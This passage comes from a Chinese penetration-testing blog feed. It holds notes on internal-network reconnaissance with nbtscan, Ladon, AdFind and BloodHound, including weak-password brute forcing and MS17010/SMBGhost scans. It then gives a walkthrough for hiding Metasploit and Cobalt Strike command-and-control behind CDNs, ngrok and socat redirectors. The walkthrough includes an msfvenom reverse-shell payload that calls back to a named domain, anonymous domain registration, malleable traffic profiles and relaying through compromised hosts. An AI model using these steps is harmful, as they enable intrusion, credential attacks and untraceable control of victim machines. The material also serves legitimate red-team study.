title="Netbios简介："></a>Netbios简介：</h4><p>IBM公司开发，主要用于数十台计算机的<strong>小型局域网</strong>。该协议是一种在局域网上的程序可以使用的应用<br>程序编程接口（API），为程序提供了请求低级服务的同一的命令集，作用是为了<strong>给局域网提供网络以及</strong><br><strong>其他特殊功能</strong>。系统可以利用<strong>WINS服务</strong>、<strong>广播</strong>及<strong>Lmhost文件</strong>等多种模式<u><strong>将NetBIOS名-——特指基于</strong></u><br><u><strong>NETBIOS协议获得计算机名称——解析为相应IP地址，实现信息通讯，所以在局域网内部使用NetBIOS</strong></u><br><u><strong>协议可以方便地实现消息通信及资源的共享</strong></u></p><h4 id="Nbtscan"><a href="#Nbtscan" class="headerlink" title="Nbtscan"></a>Nbtscan</h4><blockquote><p>项目地址：<a href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a></p></blockquote><p>使用nbtscan扫描本地或远程TCP&#x2F;IP网络上开放的NetBIOS名称服务器<br>输出的结果<strong>第一列</strong>为IP地址，<strong>第二列</strong>为机器名和所在域的名称，<strong>第三列</strong>即最后一列为及其所开启的服务<br>的列表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows： nbtscan.exe –m 10.10.10.0/24 nbtstat –n </span><br><span class="line">Linux： nbtscan -r 10.10.10.0/24</span><br><span class="line"></span><br><span class="line">y一般扫出的机器名字中包含有DC或者是域控字样的就是域控制器</span><br></pre></td></tr></table></figure><h1 id="四、工具信息收集LadanGO、Adfind等"><a href="#四、工具信息收集LadanGO、Adfind等" class="headerlink" title="四、工具信息收集LadanGO、Adfind等"></a>四、工具信息收集LadanGO、Adfind等</h1><h2 id="1-工具使用Ladongo"><a href="#1-工具使用Ladongo" class="headerlink" title="1.工具使用Ladongo"></a>1.工具使用Ladongo</h2><blockquote><p><a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p><p><a href="https://github.com/k8gege/LadonGo">https://github.com/k8gege/LadonGo</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">开源工具、很小、很厉害</span><br><span class="line">一般会被杀毒软件杀毒，要做免杀才可以</span><br><span class="line"></span><br><span class="line">001 多协议探测存活主机 （IP、机器名、MAC地址、制造商）</span><br><span class="line">Ladon 192.168.1.8/24 OnlinePC</span><br><span class="line">.\Ladon.exe 10.200.129.69/24 OnlinePC</span><br><span class="line">002 多协议识别操作系统 （IP、机器名、操作系统版本、开放服务）</span><br><span class="line">Ladon 192.168.1.8/24 OsScan</span><br><span class="line">.\Ladon.exe 10.200.129.69 OsScan</span><br><span class="line">003 扫描存活主机</span><br><span class="line">Ladon 192.168.1.8/24 OnlineIP</span><br><span class="line">.\Ladon.exe 10.200.1.1/16 OnlineIP</span><br><span class="line">004 ICMP扫描存活主机</span><br><span class="line">Ladon 192.168.1.8/24 Ping</span><br><span class="line"></span><br><span class="line">005 扫描SMB漏洞MS17010 （IP、机器名、漏洞编号、操作系统版本）</span><br><span class="line">Ladon 192.168.1.8/24 MS17010</span><br><span class="line">.\Ladon.exe 10.200.1.1/16 MS17010</span><br><span class="line">006 SMBGhost漏洞检测 CVE-2020-0796 （IP、机器名、漏洞编号、操作系统版本）</span><br><span class="line">Ladon 192.168.1.8/24 SMBGhost</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">信息收集、漏洞检测</span><br><span class="line">Ping扫描C段存活主机（任意权限）</span><br><span class="line">Ladon 192.168.1.8/24 PingScan</span><br><span class="line"></span><br><span class="line">ICMP扫描C段存活主机(管理员权限)</span><br><span class="line">Ladon 192.168.1.8/24 IcmpScan</span><br><span class="line"></span><br><span class="line">SNMP扫描C段存活主机、设备信息</span><br><span class="line">Ladon 192.168.1.8/24 SnmpScan</span><br><span class="line"></span><br><span class="line">SMB扫描C段永恒之蓝MS17010漏洞主机</span><br><span class="line">Ladon 192.168.1.8/24 MS17010</span><br><span class="line"></span><br><span class="line">SMB扫描C段永恒之黑SmbGhost漏洞主机</span><br><span class="line">Ladon 192.168.1.8/24 SmbGhost</span><br><span class="line"></span><br><span class="line">T3扫描C段开放WebLogic的主机</span><br><span class="line">Ladon 192.168.1.8/24 T3Scan</span><br><span class="line"></span><br><span class="line">HTTP扫描C段开放Web站点Banner</span><br><span class="line">Ladon 192.168.1.8/24 BannerScan</span><br><span class="line"></span><br><span class="line">HTTP扫描C段开放Web站点标题</span><br><span class="line">Ladon 192.168.1.8/24 HttpTitle</span><br><span class="line"></span><br><span class="line">TCP扫描C段开放端口服务信息</span><br><span class="line">Ladon 192.168.1.8/24 TcpBanner</span><br><span class="line"></span><br><span class="line">TCP扫描C段主机常见开放端口</span><br><span class="line">Ladon 192.168.1.8/24 PortScan</span><br><span class="line"></span><br><span class="line">密码爆破、弱口令</span><br><span class="line">扫描C段445端口Windows机器弱口令</span><br><span class="line">Ladon 192.168.1.8/24 SmbScan</span><br><span class="line"></span><br><span class="line">扫描C段22端口Linux机器SSH弱口令</span><br><span class="line">Ladon 192.168.1.8/24 SshScan</span><br><span class="line"></span><br><span class="line">扫描C段21端口FTP服务器弱口令</span><br><span class="line">Ladon 192.168.1.8/24 FtpScan</span><br><span class="line"></span><br><span class="line">扫描C段3306端口Mysql服务器弱口令</span><br><span class="line">Ladon 192.168.1.8/24 MysqlScan</span><br><span class="line"></span><br><span class="line">扫描C段1521端口Oracle服务器弱口令</span><br><span class="line">Ladon 192.168.1.8/24 OracleScan</span><br><span class="line"></span><br><span class="line">扫描C段27017端口MongoDB服务器弱口令</span><br><span class="line">Ladon 192.168.1.8/24 MongodbScan</span><br><span class="line"></span><br><span class="line">扫描C段1521端口Oracle服务器弱口令</span><br><span class="line">Ladon 192.168.1.8/24 SqlplusScan</span><br><span class="line"></span><br><span class="line">扫描C段5985端口Winrm服务器弱口令</span><br><span class="line">Ladon 192.168.1.8/24 WinrmScan</span><br><span class="line"></span><br><span class="line">扫描C段6379端口Redis服务器空口令</span><br><span class="line">Ladon 192.168.1.8/24 RedisScan</span><br><span class="line"></span><br><span class="line">扫描C段8728端口RouterOS路由器</span><br><span class="line">Ladon 192.168.1.8/24 RouterOSScan</span><br><span class="line"></span><br><span class="line">远程命令执行</span><br><span class="line">Ladon SshCmd host port user pass cmd</span><br><span class="line">Ladon WinrmCmd host port user pass cmd</span><br><span class="line">Ladon PhpShell url pass cmd</span><br><span class="line">Ladon PhpStudyDoor url cmd</span><br></pre></td></tr></table></figure><h2 id="2-工具使用之Adfind"><a href="#2-工具使用之Adfind" class="headerlink" title="2.工具使用之Adfind"></a>2.工具使用之Adfind</h2><blockquote><p>下载地址<br><a href="http://www.joeware.net/freetools/tools/adfind/index.htm">http://www.joeware.net/freetools/tools/adfind/index.htm</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">列出域控制器名称：</span><br><span class="line">AdFind -sc dclist  </span><br><span class="line">查询当前域中在线的计算机：</span><br><span class="line">AdFind -sc computers_active</span><br><span class="line">查询当前域中在线的计算机(只显示名称和操作系统)：</span><br><span class="line">AdFind -sc computers_active name operatingSystem</span><br><span class="line">查询当前域中所有计算机：</span><br><span class="line">AdFind -f &quot;objectcategory=computer&quot;</span><br><span class="line">查询当前域中所有计算机(只显示名称和操作系统)：</span><br><span class="line">AdFind -f &quot;objectcategory=computer&quot; name operatingSystem</span><br><span class="line">查询域内所有用户：</span><br><span class="line">AdFind -users name</span><br><span class="line">查询所有GPO：</span><br><span class="line">AdFind -sc gpodmp</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3-BloodHound域分析使用（如果能搭建起来将是很好用的）"><a href="#3-BloodHound域分析使用（如果能搭建起来将是很好用的）" class="headerlink" title="3.BloodHound域分析使用（如果能搭建起来将是很好用的）"></a>3.BloodHound域分析使用（如果能搭建起来将是很好用的）</h2><p>win8环境应该可以，需要.net4.0的环境</p><blockquote><p>安装&amp;使用：<a href="http://cn-sec.com/archives/146548.html">http://cn-sec.com/archives/146548.html</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、启动neo4j neo4j.bat console</span><br><span class="line">2、启动BloodHound BloodHound.exe</span><br><span class="line">3、运行程序后将生成数据导入，筛选查看</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">注意：</span><br><span class="line">BloodHound-win32-x64是在自己机器上起服务的机器</span><br><span class="line">BloodHound-master是放在目标机器上的</span><br></pre></td></tr></table></figure><h2 id="4-fscan（很强和好用）"><a href="#4-fscan（很强和好用）" class="headerlink" title="4.fscan（很强和好用）"></a>4.fscan（很强和好用）</h2><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><p>- </p></blockquote><blockquote><p><strong>声明：</strong></p><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>0x18 - 渗透测试框架进阶-ip、流量隐藏 重要！面试会问</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Attack/0x18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E8%BF%9B%E9%98%B6-ip%E3%80%81%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E9%87%8D%E8%A6%81%EF%BC%81%E9%9D%A2%E8%AF%95%E4%BC%9A%E9%97%AE.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Attack/0x18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E8%BF%9B%E9%98%B6-ip%E3%80%81%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E9%87%8D%E8%A6%81%EF%BC%81%E9%9D%A2%E8%AF%95%E4%BC%9A%E9%97%AE.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Metasploit域名上线隐藏IP"><a href="#Metasploit域名上线隐藏IP" class="headerlink" title="Metasploit域名上线隐藏IP"></a>Metasploit域名上线隐藏IP</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>为什么要隐藏IP</p><p>在拿下了目标机之后，目标机在内网里面，使用msf或者CS时，用自己的VPS做服务器的话，导致很容易被溯源。</p><h3 id="域名上线原理"><a href="#域名上线原理" class="headerlink" title="域名上线原理"></a>域名上线原理</h3><p>当我们访问域名时会经过域名解析 域名解析就是域名到IP地址的转换过程，那么就意味这我们访问域名实际上最后是访问的真实IP</p><blockquote><p><a href="https://skyao.io/learning-dns/">https://skyao.io/learning-dns/</a>         DNS各个记录的解释<br><a href="https://zhuanlan.zhihu.com/p/82909515">https://zhuanlan.zhihu.com/p/82909515</a>     cloudflare使用入门教程，国外最好免费CDN<br><a href="https://www.cloudflare.com/zh-cn/cdn/">https://www.cloudflare.com/zh-cn/cdn/</a>      cloudflare官网<br>申请域名：<a href="https://buy.cloud.tencent.com/domain">https://buy.cloud.tencent.com/domain</a><br>申请免费域名：去搜</p></blockquote><ul><li>A记录： 将域名指向一个IPv4地址（例如：100.100.100.100），需要增加A记录</li><li>CNAME记录： 如果将域名指向一个域名，实现与被指向域名相同的访问效果，需要增加CNAME记录。这个域名一般是主机服务商提供的一个域名</li><li>MX记录： 建立电子邮箱服务，将指向邮件服务器地址，需要设置MX记录。建立邮箱时，一般会根据邮箱服务商提供的MX记录填写此记录</li><li>NS记录： 域名服务器记录，可将指定域名交由其他 DNS 服务商解析管理.如果要将子域名&#x3D;&#x3D;指定某个域名服务器&#x3D;&#x3D;来解析，需要设置NS记录</li><li>TXT记录： 可填写附加文本信息，常用于域名验证.可任意填写，可为空。一般做一些验证记录时会使用此项，如：做SPF（反垃圾邮件）记录</li><li>SPF:用于指定发送邮件的服务器，是一种高效的反垃圾邮件解决方案</li><li>AAAA记录： 将主机名（或域名）指向一个IPv6地址（例如：ff03:0:0:0:0:0:0:c1），需要添加AAAA记录</li><li>PTR记录： 是A记录的&#x3D;&#x3D;逆向记录&#x3D;&#x3D;，又称&#x3D;&#x3D;做IP反查记录或指针记录&#x3D;&#x3D;，负责将IP反向解析为域名</li><li>SOA记录： SOA叫做&#x3D;&#x3D;起始授权机构记录&#x3D;&#x3D;，NS用于标识多台域名解析服务器，SOA记录用于在众多NS记录中那一台是&#x3D;&#x3D;主服务器&#x3D;&#x3D;。<br>SOA 记录表示此域名的权威解析服务器地址。 <strong>当要查询的域名在所有递归解析服务器中没要域名解析的缓存时，就会回源来请求此域名的SOA记录，也叫权威解析记录。</strong></li><li>SRV记录： SRV记录是&#x3D;&#x3D;服务器资源记录&#x3D;&#x3D;的缩写，&#x3D;&#x3D;记录服务器提供的服务&#x3D;&#x3D;，<strong>SRV记录的作用是说明一个服务器能够提供什么样的服务。</strong></li></ul><p>假设 现在有一个域名 <a href="http://www.aaa.com/">www.aaa.com</a> 配置了A记录</p><p>那么我想让我的msf上线能达到隐藏真实IP的效果吗</p><h3 id="通过CDN上线MSF"><a href="#通过CDN上线MSF" class="headerlink" title="通过CDN上线MSF"></a>通过CDN上线MSF</h3><p>CDN的全称是Content Delivery Network，即内容分发网络。其目的是&#x3D;&#x3D;通过在现有的Internet中增加一层新的CACHE(缓存)层，将网站的内容发布到最接近用户的网络”边缘“的节点，目的提高用户访问网站的先赢速度&#x3D;&#x3D;</p><p>假设您的业务源站域名为 <a href="http://www.test.com/">www.test.com</a> ，当域名接入 CDN 开始使用加速服务后，您<br>的用户发起 HTTP 请求，实际的处理流程如图所示，根据他的处理流程，CDN最后会将流量转发到真实IP上，那么我们便能通过CDN达到隐藏自身的效果<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433004.png"></p><h3 id="CDN上线具体实现"><a href="#CDN上线具体实现" class="headerlink" title="CDN上线具体实现"></a>CDN上线具体实现</h3><p>基础配置:一台VPS、一个域名</p><p>这里的VPS最好是匿名的<br>既然是隐藏自身 那么域名肯定不能使用自己备案的域名</p><blockquote><p>使用匿名信息注册域名<br><a href="https://freenom.com/">https://freenom.com/</a>  注册免费域名 如果注册失败,可以用gmail注册（因为谷歌邮箱可以使用匿名手机号注册，也就是相当于简介匿名了）<br>现在好像不行了<br><a href="https://cart.godaddy.com/">https://cart.godaddy.com/</a> 注册匿名域名，价格高</p></blockquote><p>PS：匿名域名作为CS服务器的话 容易被封</p><blockquote><p><a href="https://www.cloudflare.com/">https://www.cloudflare.com/</a>  免费CDN<br><a href="https://zhuanlan.zhihu.com/p/115535965%E5%BC%80%E5%90%AFCDN%E6%95%99%E7%A8%8B">https://zhuanlan.zhihu.com/p/115535965开启CDN教程</a><br>多地ping检验是否成功</p></blockquote><p><img src="https://note.youdao.com/yws/res/23138/WEBRESOURCE7e87e9d8f0fb6337c495603acda6dd8b" alt="image.png"></p><h3 id="注意-仅有这些端口是可以使用的"><a href="#注意-仅有这些端口是可以使用的" class="headerlink" title="注意!!!!仅有这些端口是可以使用的"></a>注意!!!!仅有这些端口是可以使用的</h3><p>&#x3D;&#x3D;Cloudflare支持的HTTP端口是：&#x3D;&#x3D;<br>80,8080,8880,2052,2082,2086,2095</p><p>&#x3D;&#x3D;Cloudflare支持的HTTPs端口是：&#x3D;&#x3D;<br>443,2053,2083,2087,2096,8443</p><h4 id="MSF生成木马"><a href="#MSF生成木马" class="headerlink" title="MSF生成木马"></a>MSF生成木马</h4><p>&#x3D;&#x3D;有了CDN之后，我们以后木马反弹shell的地址可以填写我们的域名&#x3D;&#x3D;</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_http LHOST=www.firreeoma.tk LPORT=2095 -f exe &gt; shell.exe</code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433916.png"></p><h4 id="MSF开启相对应监听"><a href="#MSF开启相对应监听" class="headerlink" title="MSF开启相对应监听"></a>MSF开启相对应监听</h4><pre><code>use exploit/multi/handlerset payload windows/x64/meterpreter/reverse_httpset lhost www.XXXX.tkset lport 2095run</code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433020.png"></p><h4 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h4><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433884.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433257.png"></p><h2 id="CobaltStrike上线隐藏IP"><a href="#CobaltStrike上线隐藏IP" class="headerlink" title="CobaltStrike上线隐藏IP"></a>CobaltStrike上线隐藏IP</h2><h3 id="CDN非法接入"><a href="#CDN非法接入" class="headerlink" title="CDN非法接入"></a>CDN非法接入</h3><p>使用CDN内容分发网络的多节点分布式技术，通过“加速、代理、缓存”隐藏在后面的静态文件或服务；最终实现对外暴露的是CDN多节点的公网域名IP，很难甚至无法溯源真实后端服务器的域名或IP！</p><p>目标上线后流量走向<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433129.png"></p><p>和MSF域名上线所需配置一样</p><p>1.开启一个listener<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433919.png"><br>2.通过此监听生成后门<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433967.png"></p><p>流量分析</p><p>观察流量信息会发现全程和CDN在做通信</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433999.png"></p><h3 id="隧道转发代理"><a href="#隧道转发代理" class="headerlink" title="隧道转发代理"></a>隧道转发代理</h3><p>利用&#x3D;&#x3D;内网穿透&#x3D;&#x3D;，将&#x3D;&#x3D;C2回连端口映射&#x3D;&#x3D;到&#x3D;&#x3D;其他公网地址&#x3D;&#x3D;，以达到测试程序通过其他公网地址进行回连，隐藏C2真实ip</p><ol><li>注册ngrok账号<br><a href="https://ngrok.com/">https://ngrok.com/</a></li></ol><p>2.下载相应版本客户端<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433895.png"></p><p>3.配置anth</p><p>4.转发端口</p><pre><code>./ngrok tcp 10088#命令执行后将本地的10088端口转发映射到0.tcp.jp.ngrok.io:19856上面ngrok                                                                                                         (Ctrl+C to quit)Hello World! https://ngrok.com/next-generationSession Status                onlineAccount                       l860637048@gmail.com (Plan: Free)Version                       3.0.5Region                        Japan (jp)Latency                       -Web Interface                 http://127.0.0.1:4040Forwarding                    tcp://0.tcp.jp.ngrok.io:19856 -&gt; localhost:10088Connections                   ttl     opn     rt1     rt5     p50     p90                              0       0       0.00    0.00    0.00    0.00</code></pre><p>使用说明<br><a href="https://dashboard.ngrok.com/get-started/setup">https://dashboard.ngrok.com/get-started/setup</a></p><p>5.CS配置listener<br>&#x3D;&#x3D;端口不要搞错了HTTP PORT C2是我们映射主机的端口，映射的主机和CS beacon联系，然后再转发到我们机器VPS的端口10088&#x3D;&#x3D;<br><img src="https://note.youdao.com/yws/res/24293/WEBRESOURCE7c8133f33d4e99905f6ad6ddc596a8c2" alt="image.png"><br>&#x3D;&#x3D;注意端口PORT对外，是ngrok的端口，bindto就是VPS对外和ngrok服务器相连的端口&#x3D;&#x3D;<br><img src="https://note.youdao.com/yws/res/24302/WEBRESOURCEd46fc7f26b308f38ce594edabcdf6713" alt="image.png"><br>6.生成payload运行上线<br><img src="https://note.youdao.com/yws/res/24300/WEBRESOURCE3aeb9941797b59c0d2bc89aba5571792" alt="image.png"></p><h4 id="流量走向情况"><a href="#流量走向情况" class="headerlink" title="流量走向情况"></a>流量走向情况</h4><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433207.png"></p><h4 id="Wireshark抓包情况分析"><a href="#Wireshark抓包情况分析" class="headerlink" title="Wireshark抓包情况分析"></a>Wireshark抓包情况分析</h4><p>并没有和我们的真实IP有交互<br><img src="https://note.youdao.com/yws/res/24304/WEBRESOURCE1ba95659c27cc4f77df410ef2d69c983" alt="image.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433547.png"></p><h3 id="转发重定向"><a href="#转发重定向" class="headerlink" title="转发重定向"></a>转发重定向</h3><p>具体实现:&#x3D;&#x3D;两台vps&#x3D;&#x3D; 一台转发机器，一台teamserver<br>可以抓肉鸡上线</p><pre><code>socat转发(需要安装)常用选项-lh将主机名添加到日志消息-v详细数据流量，文本-x详细数据流量，十六进制-d增加详细程度（最多使用4次；建议使用2次）-lf &lt;logfile&gt;记录到文件socat TCP4-LISTEN:80,fork TCP4:C2ip:80#TCP4-LISTEN:80是本地监听端口#fork TCP4:是流量转发的目标机器的IP及端口socat -d -d -d -d -lh -v -lf /var/log/socat.log TCP4-LISTEN:80,fork TCP4:C2服务器ip:C2服务器监听Port</code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433503.png"><br>&#x3D;&#x3D;解释:将此机器801端口接受到的流量转发重定向给119.45.175.218:1212&#x3D;&#x3D;</p><h4 id="1-创建监听（在监听之前需要现在肉鸡VPS上开启socat转发重定向）"><a href="#1-创建监听（在监听之前需要现在肉鸡VPS上开启socat转发重定向）" class="headerlink" title="1.创建监听（在监听之前需要现在肉鸡VPS上开启socat转发重定向）"></a>1.创建监听（在监听之前需要现在肉鸡VPS上开启socat转发重定向）</h4><p>我们监听的机器也是我们肉鸡的机器，也就是将靶机和肉鸡建立联系<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433691.png"></p><h4 id="2-通过此监听生成木马上线"><a href="#2-通过此监听生成木马上线" class="headerlink" title="2.通过此监听生成木马上线"></a>2.通过此监听生成木马上线</h4><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433539.png"></p><h4 id="Wireshark抓包分析流量"><a href="#Wireshark抓包分析流量" class="headerlink" title="Wireshark抓包分析流量"></a>Wireshark抓包分析流量</h4><p>通过查看连接情况和wireshark能够发现只和转发的机器有交互，在真实场景转发机器最好匿名<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433747.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433877.png"></p><h3 id="隐藏cs流量"><a href="#隐藏cs流量" class="headerlink" title="隐藏cs流量"></a>隐藏cs流量</h3><ul><li><h4 id="CS默认端口50050为其他端口"><a href="#CS默认端口50050为其他端口" class="headerlink" title="CS默认端口50050为其他端口"></a>CS默认端口50050为其他端口</h4></li></ul><p><code>vim teamserver 修改server_port</code></p><p><img src="https://note.youdao.com/yws/res/24885/WEBRESOURCEd62260cbd52afafb01fc6d51e77da3c0" alt="image.png"></p><ul><li><h4 id="使用命令启动CS服务端，放在后台运行"><a href="#使用命令启动CS服务端，放在后台运行" class="headerlink" title="使用命令启动CS服务端，放在后台运行"></a>使用命令启动CS服务端，放在后台运行</h4></li></ul><p>放在后台运行 避免 shell 关闭 teamserver 也关闭。</p><pre><code>nohup命令 可以将程序以忽略挂起信号的方式运行起来，被运行的程序的输出信息将不会显示到终端。nohup ./teamserver 192.168.0.102 123456 xbb.profile &amp;</code></pre><p>*<br>#### 下面正式开始隐藏cs的流量</p><p>cs配置文件Profile<br>下载地址<br><a href="https://github.com/threatexpress/malleable-c2/archive/refs/heads/master.zip">https://github.com/threatexpress/malleable-c2/archive/refs/heads/master.zip</a></p><p>keystore的生成方法：<br>去Cloudflare的SSL&#x2F;TLS源服务器创建证书，使用默认配置生成pem和key。<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433324.png"></p><p>复制证书创建txt导入，修改文件名为xxxx.pem</p><p>复制私钥创建txt导入，修改文件名为xxxx.key</p><p>将创建的pem和key文件上传至云服务器。执行以下命令（<a href="http://www.xxx.com为申请的域名)/">www.xxx.com为申请的域名）</a></p><pre><code>openssl pkcs12 -export -in xxxx.pem -inkey xxxx.key -out www.xxx.com.p12 -name www.xxx.com -passout pass:123456keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore www.xxx.com.store -srckeystore www.xxx.com.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias www.xxx.comopenssl pkcs12 -export -in www.quarry.top.pem -inkey www.quarry.top.key -out www.quarry.top.p12 -name www.quarry.top  -passout pass:123456keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore www.quarry.top.store -srckeystore www.quarry.top.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias www.quarry.top</code></pre><p>生成的keystore文件将该文件放在云服务器CS的根目录下。</p><p>然后将keystore文件名称和密码填入profile文件中。</p><p>对4.3版本Profile进行修改。需要修改的内容主要有七处，</p><p>一个是https-certificate模块中的keystore和password，修改后把注释去掉。<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433332.png"><br>另外三处为http-stager、http-get、http-post模块中的Host和Referer。<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433348.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433348.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433388.png"></p><p>剩余三处为Profile中的响应头配置，其中的header “Content-Type” “application&#x2F;javascript; charset&#x3D;utf-8”;修改为：header “Content-Type” “application&#x2F;*; charset&#x3D;utf-8”;</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433420.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433233.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433249.png"></p><p>在修改完成后，使用CS自带的c2lint对profile语法进行检查，没有报错的话说明配置是对的。<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433417.png"></p><h4 id="修改CDN配置"><a href="#修改CDN配置" class="headerlink" title="修改CDN配置"></a>修改CDN配置</h4><p>在这个Profile中，我们请求的URI是以.js结尾的，Cloudflare作为一个CDN肯定要去&#x3D;&#x3D;缓存&#x3D;&#x3D;它，但这样的话请求就无法到达我们的CS服务器，自然也就无法上线了。<br>简而言之就是，当我们的profile文件有更新的时候，需要清空CDN边缘服务器的缓存，这样新的文件才会被读取，这样才能上线<br>&#x3D;&#x3D;使用开发模式并清除缓存。&#x3D;&#x3D;<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433385.png"><br><img src="https://note.youdao.com/yws/res/24973/WEBRESOURCE9142137694b54df636080337abb6bee2" alt="image.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433483.png"><br><img src="https://note.youdao.com/yws/res/24975/WEBRESOURCE909c6752b764ffe43f6380918b595655" alt="image.png"></p><h4 id="测试上线"><a href="#测试上线" class="headerlink" title="测试上线"></a>测试上线</h4><p>启动cs，设置配置为修改好的profile<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433748.png"></p><p>对CS的listener进行配置。填入三次自己的域名，其他的默认，在https hosts处也可添加站长ping出来的cdn ip<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433455.png"></p><p>生成木马，在pc运行，成功上线<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433435.png"></p><h4 id="验证数据包"><a href="#验证数据包" class="headerlink" title="验证数据包"></a>验证数据包</h4><p>上线后Wireshark捕捉到的get数据包，104.21.40.221为我们的cdn地址。host与referer为我们的域名。<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433563.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071433879.png"></p><p><a href="https://onlinesim.ru/auth/login/?redirect=https://onlinesim.ru/v2/receive/sms?/">https://onlinesim.ru/auth/login/?redirect=https://onlinesim.ru/v2/receive/sms?/</a></p><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><p>- </p></blockquote><blockquote><p><strong>声明：</strong></p><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> Attack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>0x17 - 渗透测试框架Cobalt Strike</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Attack/CobaltStrike/0x17-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6Cobalt-Strike.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Attack/CobaltStrike/0x17-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6Cobalt-Strike.html</url>
      
